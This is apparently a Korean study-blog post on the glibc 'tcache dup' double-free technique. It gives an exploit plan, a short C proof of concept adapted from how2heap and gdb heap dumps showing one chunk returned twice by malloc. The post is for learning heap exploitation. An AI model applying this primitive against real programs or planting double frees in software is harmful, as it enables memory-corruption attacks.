---
title: tcache dup
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, tcache]
math: true
mermaid: true
---


## Description

fastbin dup과 유사하다. double free 검사 로직 존재하지 않는다.

## Exploit plan

1. 1개의 Heap 영역(a) 할당
2. 할당된 Heap 영역(a) 2번 free
3. a size와 같은 크기 2번 malloc
    - 2번째 malloc 시 a 영역 다시 할당됨

## Proof of Conecpt

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");

    fprintf(stderr, "Allocating buffer.\n");
    int *a = malloc(8);

    fprintf(stderr, "malloc(8): %p\n", a);
    fprintf(stderr, "Freeing twice...\n");
    free(a);
    free(a);

    fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
    fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));

    return 0;
}
```

1개의 Heap 영역 할당한다.

```
This file demonstrates a simple double-free attack with tcache.
Allocating buffer.
malloc(8): 0x555555756260
```

할당된 heap 영역

```
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x555555756000      0x0                 0x250                Used                None              None
0x555555756250      0x0                 0x20                 Used                None              None
```

a를 2번 free 후 tcahce 메모리 상태

```
(0x20)   tcache_entry[0](2): 0x555555756260 --> 0x555555756260 (overlap chunk with 0x555555756250(freed) )
```

free list엔 a(0x555555756260)가 2개 존재한다. 같은 크기로 할당 시 0x555555756260 영역이 2번 할당한다.

```
Now the free list has [ 0x555555756260, 0x555555756260 ].
Next allocated buffers will be same: [ 0x555555756260, 0x555555756260 ].
```

## References
- [tcache_dup.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/tcache_dup.c)